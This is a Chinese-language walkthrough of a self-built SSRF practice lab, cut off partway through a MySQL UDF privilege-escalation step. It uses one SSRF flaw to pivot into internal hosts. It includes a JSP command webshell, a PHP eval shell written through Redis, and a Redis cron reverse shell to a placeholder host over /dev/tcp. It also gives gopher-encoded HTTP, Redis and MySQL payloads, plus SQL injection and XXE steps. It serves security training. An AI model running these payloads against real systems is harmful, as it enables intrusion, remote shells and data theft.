靶场拓扑设计
======

首先来看下本次靶场的设计拓扑图：

[![img](https://shs3.b.qianxin.com/butian_public/f5025e82ef5ecd4afd6d03479341905a5.jpg)](https://shs3.b.qianxin.com/butian_public/f5025e82ef5ecd4afd6d03479341905a5.jpg)

先理清一下攻击流程，172.72.23.21 这个服务器的 Web 80 端口存在 SSRF 漏洞，并且 80 端口映射到了公网的 8080，此时攻击者通过这个 8080 端口可以借助 SSRF 漏洞发起对 172 目标内网的探测和攻击。

本场景基本上覆盖了 SSRF 常见的攻击场景，实际上 SSRF 还可以攻击 FTP、Zabbix、Memcached 等应用，由于时间和精力有限，先挖个坑，以后有机会的话再补充完善这套 SSRF 攻击场景的。

x.x.x.x:8080 - 判断 SSRF 是否存在
===========================

能够对外发起网络请求的地方，就可能存在 SSRF。首先看下目标站点的功能，获取站点快照：

[![img](https://shs3.b.qianxin.com/butian_public/ff9ef2d973502e384cb1bd5853e262dbb.jpg)](https://shs3.b.qianxin.com/butian_public/ff9ef2d973502e384cb1bd5853e262dbb.jpg)

先尝试获取外网 URL 试试看，测试一下经典的 百度 robots.txt：

[![img](https://shs3.b.qianxin.com/butian_public/fddabbaccf5fc2392263de93f7fbc0ebb.jpg)](https://shs3.b.qianxin.com/butian_public/fddabbaccf5fc2392263de93f7fbc0ebb.jpg)

测试成功，网站请求了 Baidu 的 robots.txt 文件了，并将请求页面的内容回显到了网站前端中。那么接下来尝试获取内网 URL 看看，测试请求 127.0.0.1 看看会有什么反应：

[![img](https://shs3.b.qianxin.com/butian_public/f7ff843718437d576cae17cf2867c0e7a.jpg)](https://shs3.b.qianxin.com/butian_public/f7ff843718437d576cae17cf2867c0e7a.jpg)

测试依然成功，网站请求了 127.0.0.1 的 80 端口 ，也就是此可我们浏览的界面，所以我们就看到了图片上的“套娃”现象。 通过以上两次请求，已经基本上可以确定这个输入框就是传说中的 SSRF 的漏洞点了，即没有对用户的输入进行过滤，导致可以用来发起任意的内网或者外网的请求。

172.72.23.21 - SSRF 获取本地信息
==========================

既然当前站点存在 SSRF 的话，我们可以尝试配合 file 协议来读取本地的文件信息，首先尝试使用 file 协议来读取 /etc/passwd 文件试试看：

```php
file:///etc/passwd
```

[![img](https://shs3.b.qianxin.com/butian_public/f9f0eff315c60e82a8baabd5975e675c3.jpg)](https://shs3.b.qianxin.com/butian_public/f9f0eff315c60e82a8baabd5975e675c3.jpg)

成功读取到了本地的文件信息，现在尝试来获取存在 SSRF 漏洞的本机内网 IP 地址信息，确认当前资产的网段信息：

```php
file:///etc/hosts
```

可以判断当前机器的内网地址为 172.23.23.21，那么接下来就可以对这个内网资产段进行信息收集了。

> 权限高的情况下还可以尝试读取 /proc/net/arp 或者 /etc/network/interfaces 来判断当前机器的网络情况

172.72.23.1/24 - SSRF 探测内网端口
============================

SSRF 常配合 DICT 协议探测内网端口开放情况，但不是所有的端口都可以被探测，一般只能探测出一些带 TCP 回显的端口，具体可以探测哪些端口需要大家自己动手去测试一下，BP 下使用迭代器模式爆破，设置好要爆破的 IP 和 端口即可批量探测出端口开放的信息：

[![img](https://shs3.b.qianxin.com/butian_public/f7a9cc359e4b4af7b637cbea86f5f4e89.jpg)](https://shs3.b.qianxin.com/butian_public/f7a9cc359e4b4af7b637cbea86f5f4e89.jpg)

通过爆破可以轻易地整理出端口的开放情况：

```php
172.72.23.21 - 80
172.72.23.22 - 80
172.72.23.23 - 80、3306
172.72.23.24 - 80
172.72.23.25 - 80
172.72.23.26 - 8080
172.72.23.27 - 6379
172.72.23.28 - 6379
172.72.23.29 - 3306
```

对照下拓扑图，端口开放信息都是一一匹配的，信息收集完毕，那么接下来就开始只使用最外部的 SSRF 来打穿内网吧。

> 除了使用 DICT 协议探测端口以外，还可以使用正常的 HTTP 协议获取到内网中 Web 应用的信息情况，这里就不再赘述了。

172.72.23.22 - 代码注入
===================

代码注入应用详情
--------

本版块属于上帝视角，主要作用是给读者朋友们展示一下应用本身正常的功能点情况，这样后面直接使用 SSRF 来攻击的话，思路就会更加清晰明了。

- **index.php**

一个正常的提示页面，啥都没有：

[![img](https://shs3.b.qianxin.com/butian_public/f49c159bc9edc0292a0ab2efca880ecfb.jpg)](https://shs3.b.qianxin.com/butian_public/f49c159bc9edc0292a0ab2efca880ecfb.jpg)

- **phpinfo.php**

凑数勉强算是一个敏感文件吧：

[![img](https://shs3.b.qianxin.com/butian_public/f3b7a75cad1db8902321ff8cf73c035e9.jpg)](https://shs3.b.qianxin.com/butian_public/f3b7a75cad1db8902321ff8cf73c035e9.jpg)

- **shell.php**

一个经典的 system 一句话木马：

[![img](https://shs3.b.qianxin.com/butian_public/f06720da07ec4614af2ea956301a41644.jpg)](https://shs3.b.qianxin.com/butian_public/f06720da07ec4614af2ea956301a41644.jpg)

SSRF 之目录扫描
----------

如果想要利用 SSRF 漏洞对内网 Web 资产进行目录扫描的话，使用传统的 dirsearch 等工具就不是很方便了，国光在这种场景下使用的是 Burpsuite 抓包，然后导入字典批量遍历路径参数，请求包如下：

[![img](https://shs3.b.qianxin.com/butian_public/f13482dfd9666aec1d92098940aa7ec6b.jpg)](https://shs3.b.qianxin.com/butian_public/f13482dfd9666aec1d92098940aa7ec6b.jpg)

使用 Burpsuite 自带的 Grep - Extract 可以快速地筛选页面正则匹配的结果，很明显这个 172.72.23.22 的内网站点下面还存在着 phpinfo.php 和 shell.php：

[![img](https://shs3.b.qianxin.com/butian_public/fd7913ca61eea951828f1607a0dfe78f4.jpg)](https://shs3.b.qianxin.com/butian_public/fd7913ca61eea951828f1607a0dfe78f4.jpg)

SSRF 之代码注入
----------

因为这个一句话 webshell 使用了 GET 来接受请求，所以可以直接使用 SSRF 的 HTTP 协议来发起 GET 请求，直接给 cmd 参数传入命令值，导致命令直接执行：

[![img](https://shs3.b.qianxin.com/butian_public/f24a878a91c77c66dc65f230263f75ab5.jpg)](https://shs3.b.qianxin.com/butian_public/f24a878a91c77c66dc65f230263f75ab5.jpg)

使用浏览器提交请求的话，空格得写成`%20`才可以顺利执行命令 ：

[![img](https://shs3.b.qianxin.com/butian_public/ff31ee9e811b02d854e720c50b47924f5.jpg)](https://shs3.b.qianxin.com/butian_public/ff31ee9e811b02d854e720c50b47924f5.jpg)

从 hosts 文件的结果可以看出，当前我们已经拿下了内网 172.72.23.22 这台机器的权限了。

如果从 BP 里面抓包请求的话，空格得写成`%2520`，即两次 URL 编码才可以顺利执行命令：

[![img](https://shs3.b.qianxin.com/butian_public/f9afe927ad4e507d82d86363eb7e3666d.jpg)](https://shs3.b.qianxin.com/butian_public/f9afe927ad4e507d82d86363eb7e3666d.jpg)

172.72.23.23 - SQL 注入
=====================

SQL 注入应用详情
----------

本版块属于上帝视角，主要作用是给读者朋友们展示一下应用本身正常的功能点情况，这样后面直接使用 SSRF 来攻击的话，思路就会更加清晰明了。

基础的联合查询注入，可以直接带出数据库的相关信息：

[![img](https://shs3.b.qianxin.com/butian_public/f57ce4d8fcb0e027d7d66fffdcd9bffff.jpg)](https://shs3.b.qianxin.com/butian_public/f57ce4d8fcb0e027d7d66fffdcd9bffff.jpg)

[![img](https://shs3.b.qianxin.com/butian_public/f2f6426527e48215a8cf200ad6e9d4b65.jpg)](https://shs3.b.qianxin.com/butian_public/f2f6426527e48215a8cf200ad6e9d4b65.jpg)

同时也预设了一个 flag，同样通过联合查询也可以简单的查询出 flag 的值：

[![img](https://shs3.b.qianxin.com/butian_public/f67ece167e832938cb22f570565ab67ca.jpg)](https://shs3.b.qianxin.com/butian_public/f67ece167e832938cb22f570565ab67ca.jpg)

[![img](https://shs3.b.qianxin.com/butian_public/fa6652d1d2381245f09f314993e897143.jpg)](https://shs3.b.qianxin.com/butian_public/fa6652d1d2381245f09f314993e897143.jpg)

因为管理员（国光）不小心（故意）给网站目录设置了 777 权限，所以这里可以尝试通过 MySQL 的 `INTO DUMPFILE` 直接往网站的目录下写 shell，最终借助 SQL 注入的 UNION 注入来执行写shell 的 SQL 语句 payload 如下：

[![img](https://shs3.b.qianxin.com/butian_public/fd80a1a575a7a79fd80bc166b845b19bc.jpg)](https://shs3.b.qianxin.com/butian_public/fd80a1a575a7a79fd80bc166b845b19bc.jpg)

成功写 shell 后，浏览器直接访问执行命令看看：

[![img](https://shs3.b.qianxin.com/butian_public/fce827e0265dfaa9d128fc4f637995616.jpg)](https://shs3.b.qianxin.com/butian_public/fce827e0265dfaa9d128fc4f637995616.jpg)

SSRF 之 SQL 注入
-------------

利用 SSRF 来注入内网中存在 SQLI 的资产的话，和上一个小节的 GET 型注入差不多，只要注意一些编码细节即可。

SSRF 之基础的联合查询注入，可以直接带出数据库的相关信息，和正常注入差不多，只需要将空格进行**两次 URL 编码**即可：

[![img](https://shs3.b.qianxin.com/butian_public/fd131f14cf4c5a3a7fba43aac2ca0dc09.jpg)](https://shs3.b.qianxin.com/butian_public/fd131f14cf4c5a3a7fba43aac2ca0dc09.jpg)

[![img](https://shs3.b.qianxin.com/butian_public/f3efa0d804a792b791570f3ffecdbf13f.jpg)](https://shs3.b.qianxin.com/butian_public/f3efa0d804a792b791570f3ffecdbf13f.jpg)

同理直接注入出数据库中的 flag：

[![img](https://shs3.b.qianxin.com/butian_public/f8b7b3e521a8e169413e92413d2966710.jpg)](https://shs3.b.qianxin.com/butian_public/f8b7b3e521a8e169413e92413d2966710.jpg)

往网站的目录写通过 SQL 语句来写 shell：

[![img](https://shs3.b.qianxin.com/butian_public/fe4dfadf9cade025d229b4582d383d136.jpg)](https://shs3.b.qianxin.com/butian_public/fe4dfadf9cade025d229b4582d383d136.jpg)

写入 shell 成功后尝试直接来命令执行：

[![img](https://shs3.b.qianxin.com/butian_public/f87cc1489b3e189eb78c83844cba68d92.jpg)](https://shs3.b.qianxin.com/butian_public/f87cc1489b3e189eb78c83844cba68d92.jpg)

[![img](https://shs3.b.qianxin.com/butian_public/f878e92e0c60e4086c6b177ff3b981c55.jpg)](https://shs3.b.qianxin.com/butian_public/f878e92e0c60e4086c6b177ff3b981c55.jpg)

172.72.23.24 - 命令执行
===================

命令执行应用详情
--------

本版块属于上帝视角，主要作用是给读者朋友们展示一下应用本身正常的功能点情况，这样后面直接使用 SSRF 来攻击的话，思路就会更加清晰明了。

172.72.23.24 是一个经典的命令执行，通过 POST 方式攻击者可以随意利用 Linux 命令拼接符 ip 参数，从而导致任意命令执行：

[![img](https://shs3.b.qianxin.com/butian_public/fcab67e2b328f894a41c40bbce8979707.jpg)](https://shs3.b.qianxin.com/butian_public/fcab67e2b328f894a41c40bbce8979707.jpg)

SSRF 之命令执行
----------

这种场景和之前的攻击场景稍微不太一样，之前的代码注入和 SQL 注入都是直接通过 GET 方式来传递参数进行攻击的，但是这个命令执行的场景是通过 POST 方式触发的，我们无法使用使用 SSRF 漏洞通过 HTTP 协议来传递 POST 数据，这种情况下一般就得利用 gopher 协议来发起对内网应用的 POST 请求了，gopher 的基本请求格式如下：

[![img](https://shs3.b.qianxin.com/butian_public/f3454126f0dcca2c5d49d9ff412128eaa.jpg)](https://shs3.b.qianxin.com/butian_public/f3454126f0dcca2c5d49d9ff412128eaa.jpg)

gopher 协议是一个古老且强大的协议，从请求格式可以看出来，可以传递最底层的 TCP 数据流，因为 HTTP 协议也是属于 TCP 数据层的，所以通过 gopher 协议传递 HTTP 的 POST 请求也是轻而易举的。

首先来抓取正常情况下 POST 请求的数据包，删除掉 HTTP 请求的这一行：

```php
Accept-Encoding: gzip, deflate
```

> 如果不删除的话，打出的 SSRF 请求会乱码，因为被两次 gzip 编码了。

接着在 Burpsuite 中将本 POST 数据包进行两次 URL 编码：

[![img](https://shs3.b.qianxin.com/butian_public/f0a55e789530e33c7e0b870868b8c0705.jpg)](https://shs3.b.qianxin.com/butian_public/f0a55e789530e33c7e0b870868b8c0705.jpg)

两次 URL 编码后的数据就最终的 TCP 数据流，最终 SSRF 完整的攻击请求的 POST 数据包如下：

[![img](https://shs3.b.qianxin.com/butian_public/f1514995cb00a84fa91be011074e8037f.jpg)](https://shs3.b.qianxin.com/butian_public/f1514995cb00a84fa91be011074e8037f.jpg)

可以看到通过 SSRF 成功攻击了 172.72.23.24 的命令执行 Web 应用，顺利执行了 `cat /etc/hosts` 的命令：

[![img](https://shs3.b.qianxin.com/butian_public/fd966e425f5066cff033fa1cdb4ad75a8.jpg)](https://shs3.b.qianxin.com/butian_public/fd966e425f5066cff033fa1cdb4ad75a8.jpg)

172.72.23.25 - XML 实体注入
=======================

XXE 应用详情
--------

本版块属于上帝视角，主要作用是给读者朋友们展示一下应用本身正常的功能点情况，这样后面直接使用 SSRF 来攻击的话，思路就会更加清晰明了。

本场景是一个基础的 XXE 外部实体注入场景，登录的时候用户提交的 XML 数据，且服务器后端对 XML 数据解析并将结果输出，所以可以构造一个 XXE 读取本地的敏感信息：

[![img](https://shs3.b.qianxin.com/butian_public/f6977f24c3ac41bce9f2ec37e57986c92.jpg)](https://shs3.b.qianxin.com/butian_public/f6977f24c3ac41bce9f2ec37e57986c92.jpg)

下面是 XXE 攻击的效果图：

[![img](https://shs3.b.qianxin.com/butian_public/f58292c4bdd69768c59b83b8a219934f5.jpg)](https://shs3.b.qianxin.com/butian_public/f58292c4bdd69768c59b83b8a219934f5.jpg)

SSRF 之 XXE
----------

和上一个场景 172.72.23.24 的命令执行类似，这里 XXE 也是通过在 POST 数据包里面构造 Payload 来进行攻击的，所以依然先来抓取正常情况下 XXE 攻击的 POST 请求的数据包，删除掉 `Accept-Encoding` 这一行，然后使用 Burpsuite 对 POST 数据包进行两次 URL 编码：

[![img](https://shs3.b.qianxin.com/butian_public/f8eba00a5d86ebaa9f8504367574dc16b.jpg)](https://shs3.b.qianxin.com/butian_public/f8eba00a5d86ebaa9f8504367574dc16b.jpg)

两次 URL 编码后的数据就最终的 TCP 数据流，最终 SSRF 完整的攻击请求的 POST 数据包如下：

[![img](https://shs3.b.qianxin.com/butian_public/fb4cab68a132dae78dd53569abd327158.jpg)](https://shs3.b.qianxin.com/butian_public/fb4cab68a132dae78dd53569abd327158.jpg)

可以看到通过 SSRF 成功攻击了 172.72.23.25 的 XXE Web 应用，顺利执行了 `cat /etc/hosts` 的命令：

[![img](https://shs3.b.qianxin.com/butian_public/fcc9c9c8430b2e69e4eac4c041d813b81.jpg)](https://shs3.b.qianxin.com/butian_public/fcc9c9c8430b2e69e4eac4c041d813b81.jpg)

172.72.23.26 - CVE-2017-12615
=============================

Tomcat 应用详情
-----------

本场景是一个 Tomcat 中间件，存在 CVE-2017-12615 任意写文件漏洞，这在 Tomcat 漏洞历史中也是比较经典第一个，国光这里不再赘述，没有复现的同学可以参考 vulhub 的靶场来复现次漏洞：[Tomcat PUT方法任意写文件漏洞（CVE-2017-12615）](https://github.com/vulhub/vulhub/blob/master/tomcat/CVE-2017-12615/README.zh-cn.md)

SSRF 之 CVE-2017-12615
---------------------

和之前的场景类似，国光这里不再赘述了，所以这部分写的比较简略一些。准备一个 JSP 一句话：

```php
<%
    String command = request.getParameter("cmd");
    if(command != null)
    {
        java.io.InputStream in=Runtime.getRuntime().exec(command).getInputStream();
        int a = -1;
        byte[] b = new byte[2048];
        out.print("");
        while((a=in.read(b))!=-1)
        {
            out.println(new String(b));
        }
        out.print("");
    } else {
        out.print("format: xxx.jsp?cmd=Command");
    }
%>
```

将原本攻击的 POST 数据包：

[![img](https://shs3.b.qianxin.com/butian_public/f7efafc79bb157228734940e92f8e21d7.jpg)](https://shs3.b.qianxin.com/butian_public/f7efafc79bb157228734940e92f8e21d7.jpg)

将个 POST 请求二次 URL 编码，最后通过 SSRF 发起这个 POST 请求，返回 201 状态码表示成功写 shell：

[![img](https://shs3.b.qianxin.com/butian_public/fa1bfe5661b21bbf5eb39e331dac52926.jpg)](https://shs3.b.qianxin.com/butian_public/fa1bfe5661b21bbf5eb39e331dac52926.jpg)

接着通过 SSRF 发起对 shell.jsp 的 HTTP 请求，成功执行了 `cat /etc/hosts` 的命令：

[![img](https://shs3.b.qianxin.com/butian_public/f374b96a350168875b74646084a843ba0.jpg)](https://shs3.b.qianxin.com/butian_public/f374b96a350168875b74646084a843ba0.jpg)

172.72.23.27 - Redis 未授权
========================

Redis unauth 应用详情
-----------------

内网的 172.72.23.27 主机上的 6379 端口运行着未授权的 Redis 服务，系统没有 Web 服务（无法写 Shell），无 SSH 公私钥认证（无法写公钥），所以这里攻击思路只能是使用定时任务来进行攻击了。常规的攻击思路的主要命令如下：

```php
# 清空 key
flushall

# 设置要操作的路径为定时任务目录
config set dir /var/spool/cron/

# 设置定时任务角色为 root
config set dbfilename root

# 设置定时任务内容
set x "\n* * * * * /bin/bash -i >& /dev/tcp/x.x.x.x/2333 0>&1\n"

# 保存操作
save
```

SSRF 之 Redis unauth
-------------------

SSRF 攻击的话并不能使用 redis-cli 来连接 Redis 进行攻击操作，未授权的情况下可以使用 dict 或者 gopher 协议来进行攻击，因为 gopher 协议构造比较繁琐，所以本场景建议直接使用 DICT 协议来攻击，效率会高很多，DICT 协议除了可以探测端口以外，另一个奇技淫巧就是攻击未授权的 Redis 服务，格式如下：

```php
dict://x.x.x.x:6379/<Redis 命令>
```

[![img](https://shs3.b.qianxin.com/butian_public/ff360776b93ed505ff7a9b2d43435b289.jpg)](https://shs3.b.qianxin.com/butian_public/ff360776b93ed505ff7a9b2d43435b289.jpg)

通过 SSRF 直接发起 DICT 请求，可以成功看到 Redis 返回执行完 info 命令后的结果信息，下面开始直接使用 dict 协议来创建定时任务来反弹 Shell：

```php
# 清空 key
dict://172.72.23.27:6379/flushall

# 设置要操作的路径为定时任务目录
dict://172.72.23.27:6379/config set dir /var/spool/cron/

# 在定时任务目录下创建 root 的定时任务文件
dict://172.72.23.27:6379/config set dbfilename root

# 写入 Bash 反弹 shell 的 payload
dict://172.72.23.27:6379/set x "\n* * * * * /bin/bash -i >%26 /dev/tcp/x.x.x.x/2333 0>%261\n"

# 保存上述操作
dict://172.72.23.27:6379/save
```

> SSRF 传递的时候记得要把 `&` URL 编码为 `%26`，上面的操作最好再 BP 下抓包操作，防止浏览器传输的时候被 URL 打乱编码

[![img](https://shs3.b.qianxin.com/butian_public/faec0718026e78c24e0cfa3ddb1a5b6f0.jpg)](https://shs3.b.qianxin.com/butian_public/faec0718026e78c24e0cfa3ddb1a5b6f0.jpg)

在目标系统上创建定时任务后，shell 也弹了出来，查看下 `cat /etc/hosts` 的确是 172.72.23.27 这台内网机器：

[![img](https://shs3.b.qianxin.com/butian_public/f6b6a8a983a7b6d105f9a5e2f39ecc2c0.jpg)](https://shs3.b.qianxin.com/butian_public/f6b6a8a983a7b6d105f9a5e2f39ecc2c0.jpg)

172.72.23.28 - Redis 有认证
========================

Redis auth 应用详情
---------------

本版块属于上帝视角，主要作用是给读者朋友们展示一下应用本身正常的功能点情况，这样后面直接使用 SSRF 来攻击的话，思路就会更加清晰明了。

该 172.72.23.28 主机运行着 Redis 服务，但是有密码验证，无法直接未授权执行命令：

[![img](https://shs3.b.qianxin.com/butian_public/f2196a8d3328814c71e3afb5962ce26f3.jpg)](https://shs3.b.qianxin.com/butian_public/f2196a8d3328814c71e3afb5962ce26f3.jpg)

不过除了 6379 端口还开放了 80 端口，是一个经典的 LFI 本地文件包含，可以利用此来读取本地的文件内容：

[![img](https://shs3.b.qianxin.com/butian_public/fcdf58e1f7a0b79edc232f8bd400f3773.jpg)](https://shs3.b.qianxin.com/butian_public/fcdf58e1f7a0b79edc232f8bd400f3773.jpg)

因为 Redis 密码记录在 redis.conf 配置文件中，结合这个文件包含漏洞点，那么这时来尝试借助文件包含漏洞来读取 redis 的配置文件信息，Redis 常见的配置文件路径如下：

```php
/etc/redis.conf
/etc/redis/redis.conf
/usr/local/redis/etc/redis.conf
/opt/redis/ect/redis.conf
```

成功读取到 `/etc/redis.conf` 配置文件，直接搜索 `requirepass`关键词来定位寻找密码：

拿到密码的话就可以正常和 Redis 进行交互了：

[![img](https://shs3.b.qianxin.com/butian_public/fd90d0b505b442f133e28b0c388be05d0.jpg)](https://shs3.b.qianxin.com/butian_public/fd90d0b505b442f133e28b0c388be05d0.jpg)

[![img](https://shs3.b.qianxin.com/butian_public/f7ed443fca2a9fc34ef88fdd570a64679.jpg)](https://shs3.b.qianxin.com/butian_public/f7ed443fca2a9fc34ef88fdd570a64679.jpg)

SSRF 之 Redis auth
-----------------

首先借助目标系统的 80 端口上的文件包含拿到 Redis 的密码：P@ssw0rd

[![img](https://shs3.b.qianxin.com/butian_public/fb35212d72d1718ad3342fc28e553b01e.jpg)](https://shs3.b.qianxin.com/butian_public/fb35212d72d1718ad3342fc28e553b01e.jpg)

有密码的话先使用 dict 协议进行密码认证看看：

[![img](https://shs3.b.qianxin.com/butian_public/f7e1712e2943e9e26aa462a31032ec669.jpg)](https://shs3.b.qianxin.com/butian_public/f7e1712e2943e9e26aa462a31032ec669.jpg)

但是因为 dict 不支持多行命令的原因，这样就导致认证后的参数无法执行，所以 dict 协议理论上来说是没发攻击带认证的 Redis 服务的。

那么只能使用我们的老伙计 gopher 协议了，gopher 协议因为需要原生数据包，所以我们需要抓取到 Redis 的请求数据包。可以使用 Linux 自带的 socat 命令来进行本地的模拟抓取：

命令来进行本地的模拟抓取：

```php
socat -v tcp-listen:4444,fork tcp-connect:127.0.0.1:6379
```

此时使用 redis-cli 连接本地的 4444 端口：

```php
➜  ~ redis-cli -h 127.0.0.1 -p 4444
127.0.0.1:4444>
```

服务器接着会把 4444 端口的流量接受并转发给服务器的 6379 端口，然后认证后进行往网站目录下写入 shell 的操作：

```php
# 认证 redis
127.0.0.1:4444> auth P@ssw0rd
OK

# 清空 key
127.0.0.1:4444> flushall

# 设置要操作的路径为网站根目录
127.0.0.1:4444> config set dir /var/www/html

# 在网站目录下创建 shell.php 文件
127.0.0.1:4444> config set dbfilename shell.php

# 设置 shell.php 的内容
127.0.0.1:4444> set x "\n<?php eval($_GET[1]);?>\n"

# 保存上述操作
127.0.0.1:4444> save
```

与此同时我们还可以看到详细的数据包情况，下面来记录一下关键的流量情况：

[![img](https://shs3.b.qianxin.com/butian_public/f6c4043fcbd02d5de33f535b8968dcbaf.jpg)](https://shs3.b.qianxin.com/butian_public/f6c4043fcbd02d5de33f535b8968dcbaf.jpg)

可以看到 Redis 的流量并不难理解，可以根据上图橙色标记的注释来理解一下，接下来整理出关键的请求数据包如下：

```php
*2\r
$4\r
auth\r
$8\r
P@ssw0rd\r
*1\r
$8\r
flushall\r
*4\r
$6\r
config\r
$3\r
set\r
$3\r
dir\r
$13\r
/var/www/html\r
*4\r
$6\r
config\r
$3\r
set\r
$10\r
dbfilename\r
$9\r
shell.php\r
*3\r
$3\r
set\r
$1\r
x\r
$25\r

<?php eval($_GET[1]);?>
\r
*1\r
$4\r
save\r
```

可以看到每行都是以`\r`结尾的，但是 Redis 的协议是以 CRLF (`\r\n`)结尾，所以转换的时候需要把`\r`转换为`\r\n`，然后其他全部进行 两次 URL 编码，这里借助 BP 就很容易解决：

[![img](https://shs3.b.qianxin.com/butian_public/f56ae0c1ed9f0a3ae3703cfc898301dfb.jpg)](https://shs3.b.qianxin.com/butian_public/f56ae0c1ed9f0a3ae3703cfc898301dfb.jpg)

最后放到 SSRF 的漏洞点进行请求：

[![img](https://shs3.b.qianxin.com/butian_public/fdfde961fe2fb3e8e4ac87ee9ce32681d.jpg)](https://shs3.b.qianxin.com/butian_public/fdfde961fe2fb3e8e4ac87ee9ce32681d.jpg)

执行成功的话会在 /var/www/html 根目录下写入 shell.php 文件，密码为 1，那么下面借助 SSRF 漏洞来试试看：

```php
http://172.23.23.28/shell.php?1=phpinfo();
```

[![img](https://shs3.b.qianxin.com/butian_public/fc39606f414da56656387e7ed7ab40176.jpg)](https://shs3.b.qianxin.com/butian_public/fc39606f414da56656387e7ed7ab40176.jpg)

成功 getshell，那么消化吸收一下，下面尝试使用 SSRF 来攻击 MySQL 服务吧。

172.72.23.29 - MySQL 未授权
========================

MySQL 应用详情
----------

MySQL 空密码可以登录，靶场在数据库下和系统下各放了一个 flag，通过 SSRF 可以和数据库进行交互，SSRF 进行 UDF 提权可以拿到系统下的 flag：

[![img](https://shs3.b.qianxin.com/butian_public/f74ee2574024f87a1b640b1df603f7f1f.jpg)](https://shs3.b.qianxin.com/butian_public/f74ee2574024f87a1b640b1df603f7f1f.jpg)

SSRF 之 MySQL 未授权
----------------

### 获取原始数据包

MySQL 需要密码认证时，服务器先发送 salt 然后客户端使用 salt 加密密码然后验证；但是当无需密码认证时直接发送 TCP/IP 数据包即可。所以这种情况下是可以直接利用 SSRF 漏洞攻击 MySQL 的。因为使用 gopher 协议进行攻击需要原始的 MySQL 请求的 TCP 数据包，所以还是和攻击 Redis 应用一样，这里我们使用 tcpdump 来监听抓取 3306 的认证的原始数据包：

```php
# lo 回环接口网卡 -w 报错 pcapng 数据包
tcpdump -i lo port 3306 -w mysql.pcapng
```

然后本地使用 MySQL 来执行一些测试命令：

```php
$ mysql -h127.0.0.1 -uroot -e "select * from flag.test union select user(),'www.sqlsec.com';"
+----------------+----------------------------------------+
| id             | flag                                   |
+----------------+----------------------------------------+
| 1              | flag{71***************************316} |
| root@127.0.0.1 | www.sqlsec.com                         |
+----------------+----------------------------------------+
```

中止 tcpdump 使用 Wireshark 打开 `mysql.pcapng` 数据包，追踪 TCP 流 然后过滤出发给 3306 的数据：

[![img](https://shs3.b.qianxin.com/butian_public/f76a79834fb7f3f665335800bdfd5317d.jpg)](https://shs3.b.qianxin.com/butian_public/f76a79834fb7f3f665335800bdfd5317d.jpg)

保存为原始数据「Show data as `Raw`」，并且整理成 1 行：

```php
a100000185a23f0000000001080000000000000000000000000000000000000000000000726f6f7400006d7973716c5f6e61746976655f70617373776f72640064035f6f73054c696e75780c5f636c69656e745f6e616d65086c69626d7973716c045f706964033530380f5f636c69656e745f76657273696f6e06352e362e3531095f706c6174666f726d067838365f36340c70726f6772616d5f6e616d65056d7973716c210000000373656c65637420404076657273696f6e5f636f6d6d656e74206c696d697420313d0000000373656c656374202a2066726f6d20666c61672e7465737420756e696f6e2073656c656374207573657228292c277777772e73716c7365632e636f6d270100000001
```

### 生成 gopher 数据流

然后使用如下的 Python3 脚本将数据转化为 url 编码：

```php
import sys

def results(s):
    a=[s[i:i+2] for i in range(0,len(s),2)]
    return "curl gopher://127.0.0.1:3306/_%"+"%".join(a)

if __name__=="__main__":
    s=sys.argv[1]
    print(results(s))
```

运行效果如下：

[![img](https://shs3.b.qianxin.com/butian_public/f60333e10219c338a793eacbec251559e.jpg)](https://shs3.b.qianxin.com/butian_public/f60333e10219c338a793eacbec251559e.jpg)

### SSRF 之 查询数据库

本地 curl 请求这个 gopher 协议的数据包看看：

[![img](https://shs3.b.qianxin.com/butian_public/f8d3c0e27a6c4f69fc80be4966dc53ced.jpg)](https://shs3.b.qianxin.com/butian_public/f8d3c0e27a6c4f69fc80be4966dc53ced.jpg)

从图上可以看到 gopher 请求的数据包已经成功执行了，user() 和 数据库中的 flag 都可查询出来了。

如果 curl 请求提示是一个二进制文件无法直接显示，所可以使用 `--output` 来输出到文件中，然后手动 cat 文件同样也可以看到gopher 协议交互 MySQL 的执行结果：

```php
$ curl gopher://127.0.0.1:3306/_xxx --output mysql_result
```

### SSRF 之 MySQL 提权

SSRF 攻击 MySQL 仅仅查询数据意义不大，不如直接 UDF 提权然后反弹 shell 出来更加直接，下面尝试使用 SSRF 来 UDF 提权内网的 MySQL 应用，关于 MySQL 更详细的文章可以参考我之前MySQL 漏洞利用与提权 [MySQL 漏洞利用与提权](https://www.sqlsec.com/2020/11/mysql.html) 。

首先来寻找 MySQL 的插件目录，原生的 MySQL 命令如下：

```php
$ mysql -h127.0.0.1 -uroot -e "show variables like 
'%plugin%';"
```

tcpdump 监听，使用 Wirshark 分析导出原始数据：

[![img](https://shs3.b.qianxin.com/butian_public/f5dcdf39726971f1d9dfa67da2e3f1e6f.jpg)](https://shs3.b.qianxin.com/butian_public/f5dcdf39726971f1d9dfa67da2e3f1e6f.jpg)

使用脚本将原始数据转换 gopher 协议，得到的数据如下：

```php
curl gopher://127.0.0.1:3306/_%a2%00%00%01%85%a2%3f%00%00%00%00%01%08%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%65%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%04%33%35%35%34%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%36%2e%35%31%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%21%00%00%00%03%73%65%6c%65%63%74%20%40%40%76%65%72%73%69%6f%6e%5f%63%6f%6d%6d%65%6e%74%20%6c%69%6d%69%74%20%31%20%00%00%00%03%73%68%6f%77%20%76%61%72%69%61%62%6c%65%73%20%6c%69%6b%65%20%0a%27%25%70%6c%75%67%69%6e%25%27%01%00%00%00%01
```

放入到 BP 中请求的话记得需要二次 URL 编码，可以直接获取到插件的目录信息 :

[![img](https://shs3.b.qianxin.com/butian_public/f4559de0d19cd400a3e247d43faf5fe6e.jpg)](https://shs3.b.qianxin.com/butian_public/f4559de0d19cd400a3e247d43faf5fe6e.jpg)

拿到 MySQL 的插件目录为：`/usr/lib/mysql/plugin/`

接着来写入动态链接库，原生的 MySQL 命令如下：

```php
# 因为 payload 太长 这里就先进入 MySQL 控制台
$ mysql -h127.0.0.1 -uroot

